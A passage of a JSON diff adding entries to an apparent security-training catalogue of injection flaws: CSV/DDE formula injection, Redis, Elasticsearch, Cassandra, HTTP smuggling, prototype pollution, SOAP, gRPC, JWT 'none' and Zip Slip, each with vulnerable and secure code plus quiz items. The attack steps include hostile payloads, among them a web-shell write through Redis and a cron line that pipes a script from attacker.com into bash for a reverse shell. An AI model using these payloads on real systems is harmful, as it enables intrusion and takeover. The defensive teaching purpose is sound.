+    "slug": "csv-rtf-formula-injection",
+    "title": "CSV/RTF Formula Injection (Office Macro Variant)",
+    "category": "Data Format Injection",
+    "family": "DATAFMTi",
+    "severity": "Medium",
+    "cvss": 6.5,
+    "cwe": "CWE-1236",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Formula characters (=, +, -, @) in exported CSV/RTF data execute as Office macros or DDE commands when opened in Excel or LibreOffice.",
+    "tags": ["csv", "formula-injection", "dde", "rtf", "excel"],
+    "theory": "Spreadsheet applications interpret cell values beginning with =, +, -, or @ as formulas. User-supplied data exported to CSV/RTF without sanitization can embed formula expressions or DDE links that execute when the file is opened — the RTF variant may execute without a macro-enable prompt.",
+    "howItWorks": "1. Attacker registers with name: '=HYPERLINK(\"http://attacker.com\",\"Click\")'.\n2. Application exports data to CSV without sanitization.\n3. Victim opens CSV in Excel.\n4. Excel evaluates the formula, requesting attacker's URL.\n5. Advanced: =cmd|' /C calc'!A0 executes cmd.exe via DDE.",
+    "impact": "• Data exfiltration via hyperlink formulas\n• OS command execution via DDE on unpatched Excel\n• Credential theft via phishing overlays",
+    "realWorldCVE": {
+      "id": "CVE-2014-3744",
+      "description": "Multiple web applications exported user-supplied CSV data without sanitization, enabling formula injection attacks on downstream Excel users.",
+      "year": 2014
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: CSV export without sanitization\napp.get('/export.csv', async (req, res) => {\n  const users = await db.getUsers();\n  const csvRows = users.map(u => `${u.name},${u.email}`);\n  // u.name = '=cmd|\\' /C calc\\'!A0' → Excel executes calc.exe\n  res.setHeader('Content-Type', 'text/csv');\n  res.send(csvRows.join('\\n'));\n});",
+      "secure": "// ✅ SECURE: Prefix formula characters\nfunction sanitizeCsvField(value) {\n  if (['=', '+', '-', '@'].some(c => String(value).startsWith(c))) {\n    return \"'\" + value; // Neutralize formula\n  }\n  return value;\n}\n// Apply to all exported fields"
+    },
+    "mitigation": [
+      "Prefix all CSV cell values starting with =, +, -, @ with a single-quote",
+      "Use a validated CSV library rather than manual string joining",
+      "Warn end-users not to enable macros or DDE in downloaded reports"
+    ],
+    "quiz": [
+      {
+        "question": "Which characters must be sanitized to prevent CSV formula injection?",
+        "options": [
+          "Letters A-Z",
+          "=, +, -, @, tab, carriage return at the start of cell values",
+          "Spaces and underscores",
+          "Numbers 0-9"
+        ],
+        "correctIndex": 1,
+        "explanation": "Spreadsheets treat cells starting with =, +, -, or @ as formulas. Tab and carriage return can also inject column/row breaks in CSV fields."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Can CSV injection execute code even without enabling macros?",
+        "answer": "Yes. DDE exploits using =cmd|' /C calc'!A0 can execute commands on older Excel versions without macro prompts. =HYPERLINK() formulas also silently request attacker URLs when the file opens."
+      }
+    ]
+  },
+  {
+    "id": 67,
+    "slug": "redis-command-injection",
+    "title": "Redis Command Injection",
+    "category": "Database & Query Injection",
+    "family": "REDISi",
+    "severity": "Critical",
+    "cvss": 9.4,
+    "cwe": "CWE-77",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "CRLF injection into Redis commands via user-controlled keys enables FLUSHALL, CONFIG SET web shell writing, and full data wipe.",
+    "tags": ["redis", "nosql", "crlf", "command-injection", "cache"],
+    "theory": "Redis uses a text-based protocol (RESP) where commands are separated by CRLF. String-concatenated Redis commands allow CRLF injection to add new commands — enabling FLUSHALL, CONFIG SET to write web shells via BGSAVE, or SLAVEOF to redirect the instance.",
+    "howItWorks": "1. Application: redis.set('user:' + userInput, value).\n2. Attacker: userInput = 'evil\\r\\nFLUSHALL\\r\\nCONFIG SET dir /var/www/html\\r\\nSET shell \"<?php system($_GET[cmd]); ?>\"\\r\\nBGSAVE'.\n3. Redis processes all injected commands.\n4. Web shell written to disk.\n5. Attacker accesses shell.php → full RCE.",
+    "impact": "• Complete data loss via FLUSHALL\n• Web shell upload via CONFIG SET + BGSAVE\n• Instance pivot via SLAVEOF",
+    "realWorldCVE": {
+      "id": "CVE-2022-0543",
+      "description": "Debian Redis package Lua sandbox escape allowing arbitrary code execution via eval().",
+      "year": 2022
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: String concatenation into Redis command\nconst redis = require('redis');\nconst client = redis.createClient();\n\napp.get('/cache', (req, res) => {\n  const key = req.query.key; // Attacker: evil%0d%0aFLUSHALL\n  client.get(key, (err, val) => res.json({val}));\n});",
+      "secure": "// ✅ SECURE: Use modern redis client with key validation\nconst { createClient } = require('redis');\nconst client = createClient();\nawait client.connect();\n\napp.get('/cache', async (req, res) => {\n  const key = String(req.query.key).replace(/[^a-zA-Z0-9:_-]/g, '');\n  const val = await client.get(key);\n  res.json({ val });\n});"
+    },
+    "mitigation": [
+      "Use Redis client libraries (ioredis, redis-py) — never build raw RESP commands",
+      "Enable Redis AUTH (requirepass) and bind to 127.0.0.1 only",
+      "Disable dangerous commands via rename-command in redis.conf: rename-command FLUSHALL ''"
+    ],
+    "quiz": [
+      {
+        "question": "How does Redis command injection differ from SQL injection?",
+        "options": [
+          "Redis injection uses quote escaping; SQL uses semicolons",
+          "Redis injection uses CRLF to inject new commands in the text protocol; SQL uses SQL syntax metacharacters",
+          "Redis injection only works on Windows",
+          "Redis injection requires admin credentials"
+        ],
+        "correctIndex": 1,
+        "explanation": "Redis uses RESP protocol with \\r\\n as command separators. Injecting CRLF allows injecting additional Redis commands, analogous to semicolons in SQL injection."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How can Redis command injection lead to a web shell on the file system?",
+        "answer": "Redis CONFIG SET changes the working directory and dump filename. Combined with SET to write PHP content and BGSAVE to flush to disk, an attacker can write a web shell to the web root — achieving persistent RCE. This requires Redis to run as a user with write access to the web directory."
+      }
+    ]
+  },
+  {
+    "id": 68,
+    "slug": "elasticsearch-injection",
+    "title": "Elasticsearch Query Injection",
+    "category": "Database & Query Injection",
+    "family": "ELASTICi",
+    "severity": "High",
+    "cvss": 8.5,
+    "cwe": "CWE-943",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Injected Elasticsearch Query DSL overrides search logic, dumps entire indices, or exploits Groovy/Painless scripting for RCE.",
+    "tags": ["elasticsearch", "nosql", "query-dsl", "groovy", "painless"],
+    "theory": "Elasticsearch uses JSON-based Query DSL. When applications build ES queries by string interpolation or merging user-supplied JSON, attackers override query logic using match_all, bypass filter restrictions, or inject Groovy/Painless scripts for RCE in older ES versions.",
+    "howItWorks": "1. Application builds query: {\"query\":{\"match\":{\"title\":userInput}}}.\n2. Attacker submits: {\"match_all\":{}} as userInput JSON object.\n3. Final query returns all documents in the index.\n4. Advanced: inject script: {\"source\":\"Runtime.getRuntime().exec('id')\"} for RCE in ES < 5.0.",
+    "impact": "• Full index dump exposing all documents\n• Schema discovery via field aggregation queries\n• RCE on unpatched ES via Groovy/Painless script injection",
+    "realWorldCVE": {
+      "id": "CVE-2014-3120",
+      "description": "Elasticsearch MVEL/Groovy dynamic scripting enabled unauthenticated RCE on ES instances with scripting enabled.",
+      "year": 2014
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: User-supplied JSON merged into ES query\napp.get('/search', async (req, res) => {\n  const userFilter = JSON.parse(req.query.filter); // Untrusted JSON\n  const query = { query: { bool: { must: [{ match: { category: 'products' } }, userFilter] } } };\n  // Attacker: filter={\"match_all\":{}} → returns all records\n  const results = await esClient.search({ index: 'products', body: query });\n  res.json(results);\n});",
+      "secure": "// ✅ SECURE: Build query from validated scalar inputs only\nconst ALLOWED_FIELDS = ['title', 'price', 'category'];\napp.get('/search', async (req, res) => {\n  const field = ALLOWED_FIELDS.includes(req.query.field) ? req.query.field : 'title';\n  const value = String(req.query.value).substring(0, 100);\n  const query = { query: { match: { [field]: value } } };\n  const results = await esClient.search({ index: 'products', body: query });\n  res.json(results);\n});"
+    },
+    "mitigation": [
+      "Validate and whitelist all Query DSL parameters — never merge raw user JSON into ES queries",
+      "Disable dynamic scripting in elasticsearch.yml: script.disable_dynamic: true",
+      "Apply index-level and field-level access control via X-Pack/OpenSearch Security"
+    ],
+    "quiz": [
+      {
+        "question": "What Elasticsearch query bypasses all document filters to return all records?",
+        "options": [
+          "{\"match\":{\"*\":\"*\"}}",
+          "{\"match_all\":{}}",
+          "{\"wildcard\":{\"_id\":\"*\"}}",
+          "{\"exists\":{\"field\":\"_id\"}}"
+        ],
+        "correctIndex": 1,
+        "explanation": "match_all{} returns every document in the index — the ES equivalent of SQL 'SELECT * FROM table WHERE 1=1' injection."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How would you prevent Elasticsearch query injection in a search feature?",
+        "answer": "Use a query builder pattern: define allowed fields in a server-side allowlist, accept only simple scalar values from user input — never raw JSON objects. Build the ES query programmatically using the official client with typed parameters. Apply field-level and index-level access control."
+      }
+    ]
+  },
+  {
+    "id": 69,
+    "slug": "cassandra-cql-injection",
+    "title": "Cassandra CQL Injection",
+    "category": "Database & Query Injection",
+    "family": "CQLi",
+    "severity": "High",
+    "cvss": 8.1,
+    "cwe": "CWE-89",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Unsanitized CQL query parameters enable SQL-like injection in Cassandra, bypassing WHERE clauses or dropping tables.",
+    "tags": ["cassandra", "cql", "nosql", "injection", "database"],
+    "theory": "Cassandra Query Language (CQL) is syntactically similar to SQL. Applications building CQL queries by string concatenation are vulnerable to injection that bypasses WHERE clauses using comment operators, injects ALLOW FILTERING for full partition scans, or executes DROP TABLE/TRUNCATE.",
+    "howItWorks": "1. Application builds: 'SELECT * FROM users WHERE email = \\'' + userEmail + '\\''.\n2. Attacker submits: admin@example.com' ALLOW FILTERING AND 1=1--.\n3. Full query forces full table scan; comment drops trailing quote.\n4. All user records returned regardless of partition key filter.",
+    "impact": "• Authentication bypass via WHERE clause manipulation\n• Full table scan exposing all records\n• Data destruction via DROP TABLE injection",
+    "realWorldCVE": {
+      "id": "CVE-2021-44521",
+      "description": "Apache Cassandra UDF sandbox bypass allowing arbitrary code execution via crafted CQL function definitions.",
+      "year": 2021
+    },
+    "codeExample": {
+      "language": "python",
+      "vulnerable": "# ❌ VULNERABLE: String concatenation into CQL\nfrom cassandra.cluster import Cluster\nsession = Cluster().connect('my_keyspace')\n\ndef get_user(email):\n    # Attacker: admin' ALLOW FILTERING--\n    query = f\"SELECT * FROM users WHERE email = '{email}'\"\n    return session.execute(query)  # CQL injection!",
+      "secure": "# ✅ SECURE: Use CQL prepared statements\nGET_USER = session.prepare('SELECT * FROM users WHERE email = ?')\n\ndef get_user(email):\n    return session.execute(GET_USER, [email])  # Parameterized"
+    },
+    "mitigation": [
+      "Use CQL prepared statements (session.prepare()) with bound parameters for all queries",
+      "Validate all input parameter types strictly (emails, UUIDs, integers)",
+      "Restrict Cassandra RBAC: application users should not have DROP, TRUNCATE, or schema modification privileges"
+    ],
+    "quiz": [
+      {
+        "question": "How does ALLOW FILTERING make Cassandra CQL injection worse?",
+        "options": [
+          "It enables write operations",
+          "It forces a full table scan bypassing partition key restrictions, potentially exposing all records",
+          "It disables authentication",
+          "It enables SYSTEM keyspace access"
+        ],
+        "correctIndex": 1,
+        "explanation": "ALLOW FILTERING removes Cassandra's requirement for partition key restrictions, forcing full table scans. Injecting ALLOW FILTERING transforms a scoped lookup into a full data dump."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Why might developers assume Cassandra is safe from injection?",
+        "answer": "The 'NoSQL' label creates a false sense of security. However, CQL is syntactically SQL-like and supports the same injection vectors — any database executing query strings built from user input is vulnerable, regardless of the SQL/NoSQL label."
+      }
+    ]
+  },
+  {
+    "id": 70,
+    "slug": "http-request-smuggling",
+    "title": "HTTP Request Smuggling",
+    "category": "Web & API Layer Injection",
+    "family": "SMUGGLINGi",
+    "severity": "Critical",
+    "cvss": 8.5,
+    "cwe": "CWE-444",
+    "owasp": "A01:2021 – Broken Access Control",
+    "shortDescription": "Conflicting Content-Length/Transfer-Encoding headers between proxy and backend enable request queue poisoning and session hijacking.",
+    "tags": ["smuggling", "http", "desync", "proxy", "cl-te"],
+    "theory": "HTTP request smuggling exploits discrepancies between how a frontend proxy and backend server parse HTTP/1.1 request boundaries. CL.TE desync: proxy uses Content-Length, backend uses Transfer-Encoding — an attacker embeds a second HTTP request inside the body, which the backend processes as a separate request from the next victim's connection.",
+    "howItWorks": "1. Attacker sends request with conflicting Content-Length and Transfer-Encoding headers.\n2. Frontend proxy (using CL) forwards the full body.\n3. Backend (using TE: chunked) reads first chunk as body.\n4. Remaining bytes treated as beginning of a new request.\n5. Smuggled request prefix prepended to next victim's request — session hijacking or access bypass.",
+    "impact": "• Hijack other users' requests and steal session tokens\n• Bypass frontend WAF and security controls\n• Cache poisoning affecting all subsequent users",
+    "realWorldCVE": {
+      "id": "CVE-2019-5108",
+      "description": "HTTP request smuggling in AWS Application Load Balancer allowed request queue poisoning enabling session hijacking of other users.",
+      "year": 2019
+    },
+    "codeExample": {
+      "language": "http",
+      "vulnerable": "POST / HTTP/1.1\nHost: vulnerable-site.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: X\n# Frontend (CL) sees 6 bytes; backend (TE) sees smuggled GET /admin",
+      "secure": "# ✅ SECURE: Normalize headers at reverse proxy\n# nginx.conf:\nproxy_http_version 1.1;\nproxy_set_header Transfer-Encoding '';\n# Use HTTP/2 end-to-end — eliminates CL/TE ambiguity"
+    },
+    "mitigation": [
+      "Normalize and strip ambiguous CL/TE headers at the reverse proxy before forwarding",
+      "Use HTTP/2 end-to-end — HTTP/2 binary framing eliminates CL/TE desync",
+      "Configure backend servers to reject requests with both Content-Length and Transfer-Encoding"
+    ],
+    "quiz": [
+      {
+        "question": "What does CL.TE mean in HTTP request smuggling context?",
+        "options": [
+          "Content-Language.Text-Encoding mismatch",
+          "Front-end uses Content-Length; back-end uses Transfer-Encoding to parse boundaries",
+          "Client-side Length vs. Time-based Encoding",
+          "Cookie-Length vs. Token-Exchange"
+        ],
+        "correctIndex": 1,
+        "explanation": "CL.TE: frontend proxy uses Content-Length while backend uses Transfer-Encoding: chunked — this discrepancy allows smuggling a second request inside the body of the first."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How can you detect HTTP request smuggling vulnerabilities?",
+        "answer": "Use Burp Suite's HTTP Request Smuggler extension for timing-based probes. CL.TE: send a request with Content-Length shorter than the body — backend timeout waiting for more bytes confirms TE usage. PortSwigger's labs provide a safe practice environment."
+      }
+    ]
+  },
+  {
+    "id": 71,
+    "slug": "prototype-pollution-js",
+    "title": "Prototype Pollution (JavaScript Objects)",
+    "category": "Web & API Layer Injection",
+    "family": "PROTOi",
+    "severity": "High",
+    "cvss": 7.3,
+    "cwe": "CWE-1321",
+    "owasp": "A08:2021 – Software and Data Integrity Failures",
+    "shortDescription": "Injecting __proto__ or constructor keys into JavaScript objects poisons Object.prototype, enabling authorization bypass and XSS.",
+    "tags": ["prototype-pollution", "javascript", "nodejs", "object-injection"],
+    "theory": "JavaScript's prototype chain means every object inherits from Object.prototype. Deep object merging with user-supplied JSON containing __proto__ or constructor.prototype keys sets properties on Object.prototype itself — affecting every object in the runtime, bypassing authorization checks (isAdmin: true on all objects).",
+    "howItWorks": "1. Application calls _.merge({}, userSuppliedObject).\n2. Attacker sends: {\"__proto__\": {\"isAdmin\": true}}.\n3. lodash.merge sets Object.prototype.isAdmin = true.\n4. All subsequent if (user.isAdmin) checks return true — for every user.\n5. Effective privilege escalation of all users without DB change.",
+    "impact": "• Authorization bypass — all objects inherit injected properties\n• Client-side XSS via polluted DOM sink properties\n• Node.js DoS by overriding built-in object methods",
+    "realWorldCVE": {
+      "id": "CVE-2021-20083",
+      "description": "jquery-deparam prototype pollution via URL query string parsing allowed property injection onto Object.prototype.",
+      "year": 2021
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: Deep merging user JSON with lodash\nconst _ = require('lodash');\n\napp.post('/settings', (req, res) => {\n  const settings = {};\n  _.merge(settings, req.body); // {\"__proto__\":{\"isAdmin\":true}} → poisons prototype\n  if (settings.isAdmin) { /* now true for ALL objects! */ }\n});",
+      "secure": "// ✅ SECURE: Sanitize keys and use null prototype\nfunction sanitizeKeys(obj) {\n  const DENY = new Set(['__proto__', 'constructor', 'prototype']);\n  return Object.fromEntries(Object.entries(obj).filter(([k]) => !DENY.has(k)));\n}\napp.post('/settings', (req, res) => {\n  const clean = sanitizeKeys(req.body);\n  const settings = Object.assign(Object.create(null), clean); // Null prototype\n});"
+    },
+    "mitigation": [
+      "Sanitize __proto__, constructor, and prototype keys from all user-supplied objects before merging",
+      "Upgrade lodash to >=4.17.21, qs to >=6.10.3",
+      "Use Object.create(null) for user-input maps — null prototype objects cannot be polluted"
+    ],
+    "quiz": [
+      {
+        "question": "Why does setting Object.prototype.isAdmin=true affect ALL objects in JavaScript?",
+        "options": [
+          "JavaScript copies properties to all existing objects",
+          "All objects inherit from Object.prototype — polluting it affects every property lookup not found as own property",
+          "JavaScript has global scope for all variables",
+          "isAdmin is a reserved keyword"
+        ],
+        "correctIndex": 1,
+        "explanation": "When no own property is found, JavaScript traverses the prototype chain. Object.prototype is at the end of every chain — properties set there are visible on all objects unless they have a null prototype."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does prototype pollution differ between client-side and server-side JavaScript?",
+        "answer": "Client-side: enables DOM-based XSS by setting properties read by DOM sinks (innerHTML, eval). Server-side (Node.js): bypasses authorization logic, overrides Express configuration objects, or causes DoS by overriding built-in methods like hasOwnProperty — sometimes as a precursor to RCE."
+      }
+    ]
+  },
+  {
+    "id": 72,
+    "slug": "soap-injection",
+    "title": "SOAP Injection",
+    "category": "Web & API Layer Injection",
+    "family": "SOAPi",
+    "severity": "High",
+    "cvss": 8.0,
+    "cwe": "CWE-91",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Unescaped user input in SOAP XML envelopes injects additional XML elements, bypassing authentication or embedding XXE entities.",
+    "tags": ["soap", "xml", "web-service", "wsdl", "injection"],
+    "theory": "SOAP uses XML envelopes for web service communication. When user input is embedded in SOAP message bodies via string concatenation, attackers inject XML metacharacters to close existing elements, inject new elements (role, isAdmin), or embed XXE entities within the SOAP body.",
+    "howItWorks": "1. Application builds SOAP body: '<Name>' + userInput + '</Name>'.\n2. Attacker submits: alice</Name><isAdmin>true</isAdmin><!--.\n3. SOAP body: <Name>alice</Name><isAdmin>true</isAdmin><!--</Name>.\n4. XML parser processes isAdmin=true as valid element.\n5. Service grants admin access.",
+    "impact": "• Authentication bypass via injected privilege elements\n• Business logic manipulation in enterprise SOAP services\n• XXE file read and SSRF via external entity injection",
+    "realWorldCVE": {
+      "id": "CVE-2020-2883",
+      "description": "Oracle WebLogic Server SOAP injection via T3 and IIOP protocols allowed unauthenticated RCE.",
+      "year": 2020
+    },
+    "codeExample": {
+      "language": "java",
+      "vulnerable": "// ❌ VULNERABLE: Building SOAP by string concatenation\nString name = request.getParameter(\"name\");\nString soapBody = \"<soapenv:Body>\" +\n  \"<login><Username>\" + name + \"</Username></login>\" +\n  // Attacker: admin</Username><isAdmin>true</isAdmin><!--\n  \"</soapenv:Body>\";",
+      "secure": "// ✅ SECURE: Use SAAJ API\nMessageFactory factory = MessageFactory.newInstance();\nSOAPMessage message = factory.createMessage();\nSOAPBodyElement loginElem = body.addBodyElement(new QName(\"login\"));\nSOAPElement usernameElem = loginElem.addChildElement(\"Username\");\nusernameElem.addTextNode(name); // Text node — XML injection impossible"
+    },
+    "mitigation": [
+      "Use SAAJ or typed SOAP builders — never string concatenation into XML",
+      "Validate all SOAP messages against strict WSDL/XSD schemas before processing",
+      "Disable external entity processing in the XML parser used by the SOAP framework"
+    ],
+    "quiz": [
+      {
+        "question": "What type of attack can be embedded within a SOAP injection payload?",
+        "options": [
+          "SQL injection via SOAP headers only",
+          "XXE injection via DOCTYPE or ENTITY declarations in the SOAP body",
+          "CSS injection via SOAP styling",
+          "HTML injection only"
+        ],
+        "correctIndex": 1,
+        "explanation": "SOAP messages are XML documents. If the server's XML parser processes external entities, SOAP injection can embed DOCTYPE with ENTITY declarations — achieving XXE file read, SSRF, or DoS within the SOAP request."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How do you test for SOAP injection in a black-box assessment?",
+        "answer": "Identify SOAP endpoints (.asmx, .svc, ?wsdl). Intercept with Burp Suite. Inject XML metacharacters in parameter values: <, >, &, ', \". Try closing tags + new elements: alice</Name><isAdmin>true</isAdmin>. Test for XXE with DOCTYPE pointing to internal resources. Monitor for behavior changes, errors, or unexpected privilege grants."
+      }
+    ]
+  },
+  {
+    "id": 73,
+    "slug": "grpc-protobuf-injection",
+    "title": "gRPC / Protobuf Injection",
+    "category": "Web & API Layer Injection",
+    "family": "GRPCi",
+    "severity": "Medium",
+    "cvss": 6.5,
+    "cwe": "CWE-74",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Malformed Protobuf field types, Any type_url confusion, or oversized messages bypass server validation or crash the gRPC parser.",
+    "tags": ["grpc", "protobuf", "rpc", "injection", "type-confusion"],
+    "theory": "gRPC uses Protocol Buffers for message serialization. Attack surfaces include: google.protobuf.Any fields where type_url is not validated; oversized varint encodings causing parser integer overflow; deeply recursive messages causing stack overflow DoS; unknown field retention enabling schema version bypass.",
+    "howItWorks": "1. Identify gRPC endpoint accepting google.protobuf.Any or polymorphic types.\n2. Craft message with type_url pointing to a privileged internal message type.\n3. Server deserializes the Any field as attacker-specified type without validation.\n4. Business logic processes the crafted message as a trusted internal type.\n5. Alternatively: deeply nested recursive message causes stack overflow DoS.",
+    "impact": "• Type confusion attacks escalating to privileged operations\n• Parser DoS via recursive messages or malformed varint\n• Unknown field injection between service versions",
+    "realWorldCVE": {
+      "id": "CVE-2022-3171",
+      "description": "Protobuf-java parsing of inputs with many group field instances caused exponential CPU time increase, enabling DoS on gRPC services.",
+      "year": 2022
+    },
+    "codeExample": {
+      "language": "go",
+      "vulnerable": "// ❌ VULNERABLE: Accepting Any without type_url validation\nfunc (s *Server) ProcessAction(ctx context.Context, req *pb.ActionRequest) (*pb.ActionResponse, error) {\n    var action interface{}\n    req.Payload.UnmarshalTo(&action) // type_url not checked!\n    return executeAction(action), nil // Could be any internal type\n}",
+      "secure": "// ✅ SECURE: Validate type_url against allowlist\nvar ALLOWED_TYPES = map[string]bool{\"type.googleapis.com/myapp.UserAction\": true}\nfunc (s *Server) ProcessAction(ctx context.Context, req *pb.ActionRequest) (*pb.ActionResponse, error) {\n    if !ALLOWED_TYPES[req.Payload.GetTypeUrl()] {\n        return nil, status.Error(codes.InvalidArgument, \"invalid action type\")\n    }\n    var userAction pb.UserAction\n    req.Payload.UnmarshalTo(&userAction)\n    return executeUserAction(&userAction), nil\n}"
+    },
+    "mitigation": [
+      "Validate google.protobuf.Any type_url against a strict allowlist of expected message types",
+      "Set maximum message depth and size limits in gRPC server configuration",
+      "Use proto3 with explicit field validation — treat unknown fields from external clients as untrusted"
+    ],
+    "quiz": [
+      {
+        "question": "What gRPC feature is most commonly exploited for type confusion?",
+        "options": [
+          "Protobuf field numbering",
+          "google.protobuf.Any — carries any message type identified only by a type_url string",
+          "gRPC streaming mode",
+          "TLS mutual authentication"
+        ],
+        "correctIndex": 1,
+        "explanation": "google.protobuf.Any wraps any message with a type_url identifier. Without validation, attackers substitute a privileged internal message type, causing the server to process the crafted message as trusted."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does unknown field retention in proto3 create a security risk?",
+        "answer": "Proto3 retains unknown fields by default and re-serializes them when forwarding. In a microservice pipeline, an attacker can add fields unknown to Service A (passing validation) but recognized as security-sensitive by Service B — effectively bypassing validation by exploiting schema version differences."
+      }
+    ]
+  },
+  {
+    "id": 74,
+    "slug": "jwt-none-algorithm",
+    "title": "JWT \"none\" Algorithm / Token Injection",
+    "category": "Web & API Layer Injection",
+    "family": "JWTi",
+    "severity": "Critical",
+    "cvss": 9.1,
+    "cwe": "CWE-347",
+    "owasp": "A07:2021 – Identification and Authentication Failures",
+    "shortDescription": "JWT libraries accepting alg:none allow signature stripping and arbitrary claim forgery — full authentication bypass without the secret key.",
+    "tags": ["jwt", "authentication", "none-algorithm", "token-forgery"],
+    "theory": "JWT consists of header.payload.signature. Vulnerable JWT libraries accepting the 'none' algorithm process unsigned tokens as valid. Attackers change alg to 'none', modify any claim (sub, role, email), remove the signature, and submit — authenticating as any user without the secret key.",
+    "howItWorks": "1. Capture a valid JWT: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.SIGNATURE.\n2. Decode header: {\"alg\":\"HS256\"} → change to {\"alg\":\"none\"}.\n3. Decode payload: {\"user\":\"user\"} → change to {\"user\":\"admin\",\"role\":\"admin\"}.\n4. Re-encode: base64url(header).base64url(payload). (no signature)\n5. Server with vulnerable jwt.verify() accepts → admin access.",
+    "impact": "• Complete authentication bypass — forge any user identity\n• Privilege escalation to admin roles\n• Account takeover of any user",
+    "realWorldCVE": {
+      "id": "CVE-2015-9235",
+      "description": "jwt-simple Node.js library accepted JWTs with alg:none allowing signature bypass, enabling unauthenticated access to applications using jwt-simple.",
+      "year": 2015
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: jwt.verify() without algorithm restriction\nconst jwt = require('jsonwebtoken');\n\napp.use((req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  req.user = jwt.verify(token, process.env.JWT_SECRET); // Accepts alg:none!\n  next();\n});",
+      "secure": "// ✅ SECURE: Explicitly whitelist allowed algorithms\nconst jwt = require('jsonwebtoken');\n\napp.use((req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  req.user = jwt.verify(token, process.env.JWT_SECRET, {\n    algorithms: ['HS256'],  // Reject 'none', 'RS256' etc.\n    issuer: 'injectionlab.local',\n    audience: 'api.injectionlab.local',\n  });\n  next();\n});"
+    },
+    "mitigation": [
+      "Always pass an algorithms whitelist to jwt.verify(): {algorithms: ['RS256']} — never accept 'none'",
+      "Validate all JWT claims: iss (issuer), aud (audience), exp (expiry), nbf (not before)",
+      "Use asymmetric algorithms (RS256, ES256) so the signing key is never exposed to verifying services"
+    ],
+    "quiz": [
+      {
+        "question": "What does the JWT 'none' algorithm attack exploit?",
+        "options": [
+          "A timing side-channel in HMAC comparison",
+          "JWT libraries that accept the RFC-defined 'none' algorithm, treating unsigned tokens as valid",
+          "Brute-forcing the HS256 secret",
+          "SQL injection in the JWT payload"
+        ],
+        "correctIndex": 1,
+        "explanation": "The JWT RFC defines 'none' as a valid unsecured algorithm for cases where integrity is provided by other means. Vulnerable libraries implement this spec faithfully — accepting 'none' tokens without any signature verification."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Describe the complete JWT none algorithm attack step by step.",
+        "answer": "1) Obtain any valid JWT. 2) Split on periods and base64url-decode each part. 3) Change header 'alg' to 'none'. 4) Modify payload claims (sub, role, email) to desired values. 5) Remove the signature (leave empty string after last period). 6) Submit header.payload. — vulnerable server accepts it. Authentication bypassed."
+      }
+    ]
+  },
+  {
+    "id": 75,
+    "slug": "zip-slip",
+    "title": "Zip Slip (Archive Path Traversal)",
+    "category": "File & Archive Injection",
+    "family": "ARCHIVEi",
+    "severity": "High",
+    "cvss": 8.8,
+    "cwe": "CWE-22",
+    "owasp": "A01:2021 – Broken Access Control",
+    "shortDescription": "Archive entries with path-traversal sequences (../../) extract outside the target directory, overwriting system files for RCE.",
+    "tags": ["zip-slip", "path-traversal", "archive", "rce", "file-upload"],
+    "theory": "ZIP, TAR, JAR, and similar archives store filenames as strings including relative paths. When extraction libraries don't canonicalize entry filenames, entries with ../../ sequences write files outside the intended extraction directory — overwriting cron jobs, SSH keys, or application files for RCE. Affects both Windows and Linux.",
+    "howItWorks": "1. Attacker crafts ZIP with entry: ../../../../etc/cron.d/reverse_shell.\n2. Entry content: * * * * * root curl http://attacker.com/shell.sh | bash.\n3. Application extracts ZIP to /var/uploads/.\n4. Library writes cron entry to /etc/cron.d/reverse_shell.\n5. Cron executes every minute — reverse shell connects to attacker.",
+    "impact": "• RCE via cron job, SSH key, or web shell overwrite\n• Application configuration overwrite for persistent backdoor\n• DoS by overwriting critical system libraries",
+    "realWorldCVE": {
+      "id": "CVE-2018-1002201",
+      "description": "zip4j Java library path traversal during ZIP extraction allowed arbitrary file write in any Java application using zip4j.",
+      "year": 2018
+    },
+    "codeExample": {
+      "language": "python",
+      "vulnerable": "# ❌ VULNERABLE: Extracting ZIP without path validation\nimport zipfile\n\ndef extract_upload(zip_path, extract_to):\n    with zipfile.ZipFile(zip_path, 'r') as zf:\n        for member in zf.infolist():\n            zf.extract(member, extract_to)  # No path validation!\n            # '../../../../etc/cron.d/evil' → /etc/cron.d/evil",
+      "secure": "# ✅ SECURE: Validate each entry path before extraction\nimport zipfile, os\n\ndef safe_extract(zip_path, extract_to):\n    extract_to = os.path.realpath(extract_to)\n    with zipfile.ZipFile(zip_path, 'r') as zf:\n        for member in zf.infolist():\n            target = os.path.realpath(os.path.join(extract_to, member.filename))\n            if not target.startswith(extract_to + os.sep):\n                raise ValueError(f'Zip Slip detected: {member.filename}')\n            zf.extract(member, extract_to)"
+    },
+    "mitigation": [
+      "Canonicalize archive entry paths with os.path.realpath() and verify they stay within extraction directory",
+      "Use Python's zipfile with manual path checking or Java's ZipSecureFile from Apache Commons Compress",
+      "Apply restrictive OS file permissions on extraction target directories"
+    ],
+    "quiz": [
+      {
+        "question": "How does Zip Slip differ from a standard path traversal attack?",
+        "options": [
+          "Zip Slip targets databases; path traversal targets files",
